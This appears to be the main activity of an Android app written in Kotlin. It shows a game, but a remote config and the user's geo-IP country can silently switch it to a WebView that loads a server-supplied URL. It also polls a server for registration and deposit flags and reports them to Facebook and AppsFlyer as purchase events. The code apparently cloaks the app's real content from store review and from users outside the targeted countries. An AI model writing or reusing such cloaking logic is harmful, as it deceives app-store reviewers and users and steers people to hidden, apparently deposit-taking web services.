package com.rikoriko.rctst

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AFInAppEventType
import com.appsflyer.AppsFlyerLib
import com.rikoriko.rctst.Interface.*
import com.rikoriko.rctst.common.GeoUrl
import com.rikoriko.rctst.common.GitUrl
import com.rikoriko.rctst.common.GlobalVariable
import com.rikoriko.rctst.common.SayYesUrl
import com.rikoriko.rctst.game.GameActivity
import com.rikoriko.rctst.model.DataGeo
import com.rikoriko.rctst.model.DataGit
import com.rikoriko.rctst.model.DataSayYes
import com.rikoriko.rctst.utils.AppsFlyer
import com.rikoriko.rctst.utils.Hash
import com.rikoriko.rctst.utils.WebViewActivity
import com.facebook.appevents.AppEventsLogger
import com.onesignal.OneSignal
import okhttp3.HttpUrl
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.util.*

class MainActivity : AppCompatActivity() {

    private lateinit var gitService: GitServices
    private lateinit var geoService: GeoServices
    private lateinit var sayYesServices: SayYesServices

    private lateinit var mActive : String
    private lateinit var mCountries : String
    private lateinit var mGeoPosition : String
    private lateinit var mUrl : String
    private lateinit var mCampaign : String

    var logger: AppEventsLogger? = null
    var params = Bundle()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        generateHash()

        logger = AppEventsLogger.newLogger(this, "959269878145234")

        gitService = GitUrl.gitService
        geoService = GeoUrl.geoService
        sayYesServices = SayYesUrl.sayYesServices

        getDataGeo(object : GeoServicesData {
            override fun getGeo(getGeo: String?) {
                mGeoPosition = getGeo!!
                //Log.d("MyLog", "GeoUser: $getGeo")
            }
        })

        getDataGit(object : GitServicesData {
            override fun getActive(getActive: String?) {
                mActive = getActive!!
                //Log.d("MyLog", "Active: $getActive")
            }

            override fun getCountries(getCountries: String?) {
                mCountries = getCountries!!
                //Log.d("MyLog", "Countries: $getCountries")
            }

            override fun getUrl(gitUrl: String?) {
                mUrl = gitUrl!!
               // Log.d("MyLog", "Url: $gitUrl")
            }
        })

        val mainHandler = Handler(Looper.getMainLooper())

        mainHandler.post(object : Runnable {
            override fun run() {
                getDataSayYes(object : SayYesServicesData {
                    override fun getReg(getReg: Int?) {
                        FbEventReg(getReg!!)
                    }
                    override fun getDep(getDep: Int?) {
                        FbEventDep(getDep!!)
                    }
                })
                mainHandler.postDelayed(this, 3000)
            }
        })

        AppsFlyer.AppsFlyer.appsFlyer(object : AppsFlyerData {
            override fun getCampaign(getCampaign: String?) {
                mCampaign = getCampaign!!

                if (mActive == "true") {
                    oneSignalInit()
                    startProgram()
                } else {
                    startGame()
                }

                //Log.d("MyLog", "Campaign: $getCampaign")
            }
        })

    } //onCreate

    private fun getDataGit(gitServicesData: GitServicesData) {

        gitService.getDataGit(GlobalVariable.appId).enqueue(object : Callback<DataGit> {
            override fun onFailure(call: Call<DataGit>, t: Throwable) {
            }

            override fun onResponse(call: Call<DataGit>, response: Response<DataGit>) {
                val dataGit = response.body()

                val url = dataGit?.url
                gitServicesData.getUrl(url);
                val active = dataGit?.active
                gitServicesData.getActive(active)
                val countries = dataGit?.countries
                gitServicesData.getCountries(countries)

                /*if (url != null) {
                    val httpUrl = HttpUrl.parse(url)!!.newBuilder()
                            .addQueryParameter(GlobalVariable.hash, hashAF)
                            .addQueryParameter(GlobalVariable.app_id, GlobalVariable.appId)
                            .build()
                    gitServicesData.getUrl(httpUrl.toString())
                }*/

                if (url != null) {
                    val httpUrl = HttpUrl.parse(url)!!.newBuilder()
                            .addQueryParameter(GlobalVariable.app_id, GlobalVariable.appId)
                            .addQueryParameter(GlobalVariable.hash, GlobalVariable.hashId)
                            .build()
                    gitServicesData.getUrl(httpUrl.toString())
                }

            }
        })
    }

    private fun getDataGeo(geoServicesData: GeoServicesData) {

        geoService.getDataGeo().enqueue(object : Callback<DataGeo> {
            override fun onFailure(call: Call<DataGeo>, t: Throwable) {
            }

            override fun onResponse(call: Call<DataGeo>, response: Response<DataGeo>) {
                val dataGeo = response.body()

                val geo = dataGeo?.geoplugin_countryCode
                geoServicesData.getGeo(geo)
            }
        })
    }

    private fun getDataSayYes(sayYesServicesData: SayYesServicesData) {

        sayYesServices.getSayYesModel(GlobalVariable.appId, GlobalVariable.hashId, GlobalVariable.android_request).enqueue(object : Callback<DataSayYes> {
            override fun onFailure(call: Call<DataSayYes>, t: Throwable) {
            }

            override fun onResponse(call: Call<DataSayYes>, response: Response<DataSayYes>) {
                val dataSayYes = response.body()

                val success = dataSayYes?.success
               // Log.d("MyLog", "success: $success")

                if (success == 1) {
                    val reg = dataSayYes?.reg
                    sayYesServicesData.getReg(reg)
                    val dep = dataSayYes?.dep
                    sayYesServicesData.getDep(dep)
                }
            }
        })
    }

    private fun oneSignalInit() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(GlobalVariable.ONESIGNAL_APP_ID)
    }

    private fun checkGeoPosition(geoUser: String, countriesGit: String): Boolean {
         val preferences = getSharedPreferences("preferences", MODE_PRIVATE)
         var checkGeoFirstStart = preferences.getBoolean("checkGeoPosition", false)

        if (!checkGeoFirstStart && countriesGit.toUpperCase().contains(geoUser.toUpperCase())) {
            val editor = preferences.edit()
            editor.putBoolean("checkGeoPosition", true)
            editor.apply()
        }

        if (!checkGeoFirstStart && countriesGit == "ALL") {
            val editor = preferences.edit()
            editor.putBoolean("checkGeoPosition", true)
            editor.apply()
        }
        return checkGeoFirstStart
    }

    fun startGame() {
        val gameView = Intent(applicationContext, GameActivity::class.java)
        startActivity(gameView)
    }

    fun startWebView(gitUrl: String?) {
        val webView = Intent(this, WebViewActivity::class.java)
        webView.putExtra("gitUrl", gitUrl)
        startActivity(webView)
    }

    fun startProgram() {
        val preferences = getSharedPreferences("firsStartProgram", MODE_PRIVATE)
        val firsStartProgram = preferences.getBoolean("firsStartProgram", false)
        val urlCampaing = preferences.getString("mCampaign", "")
        val editor = preferences.edit()

        checkGeoPosition(mGeoPosition, mCountries)

        if (!firsStartProgram) {
            if (mCampaign != "") {
                mUrl = "$mUrl&$mCampaign"
                mCampaign = "&$mCampaign"
                editor.putString("mCampaign", mCampaign)
                editor.apply()
            }

            if (checkGeoPosition(mGeoPosition, mCountries)) {
                startWebView(mUrl)
                editor.putBoolean("firsStartProgram", true)
                editor.apply()
            } else {
                startGame()
            }

        } else if (!urlCampaing!!.isEmpty() && mActive == "true" && firsStartProgram) {
            startWebView(mUrl + urlCampaing)
        } else if (urlCampaing.isEmpty() && mActive == "true" && firsStartProgram) {
            startWebView(mUrl)
        } else {
            startGame()
        }

        //Log.d("MyLog" , "url + campaing: $mUrl$urlCampaing");
    }

    private fun FbEventReg(reg: Int) {
        val preferences = getSharedPreferences("FbEventReg", MODE_PRIVATE)
        val firstStart = preferences.getBoolean("FbEventReg", true)

        if (firstStart && reg == 1) {
            val editor = preferences.edit()
            editor.putBoolean("FbEventReg", false)
            editor.apply()

            params.putString("INITIATED_CHECKOUT", "INITIATED_CHECKOUT")
            logger!!.logEvent("FbEventReg", params)

            val appsEventData: Map<String, Any> = HashMap()
            AppsFlyerLib.getInstance().logEvent(applicationContext, AFInAppEventType.ADD_PAYMENT_INFO, appsEventData)
        }

        //Log.d("MyLog", "FbEventReg: $firstStart")
    }

    private fun FbEventDep(dep: Int) {
        val preferences = getSharedPreferences("FbEventDep", MODE_PRIVATE)
        val firstStart = preferences.getBoolean("FbEventDep", true)

        if (firstStart && dep == 1) {
            val editor = preferences.edit()
            editor.putBoolean("FbEventDep", false)
            editor.commit()

            params.putString("ADDED_PAYMENT_INFO", "ADDED_PAYMENT_INFO")
            logger!!.logEvent("FbEventDep", params)

            val appsEventData: Map<String, Any> = HashMap()
            AppsFlyerLib.getInstance().logEvent(applicationContext, AFInAppEventType.PURCHASE, appsEventData)
        }

        //Log.d("MyLog", "FbEventDep: $firstStart")
    }

    fun generateHash() {
        val preferences = getSharedPreferences("oneGenerateHash", MODE_PRIVATE)
        val oneGenerateHash = preferences.getBoolean("oneGenerateHash", false)
        val editor = preferences.edit()
        var hashId = ""
        if (!oneGenerateHash) {
            hashId = Hash.generateHash(21)
            editor.putString("hashId", hashId)
            editor.putBoolean("oneGenerateHash", true)
            editor.apply()
        }
        GlobalVariable.hashId = preferences.getString("hashId", "")!!
        Log.d("MyLog", "HashID: " + GlobalVariable.hashId)
    }

}
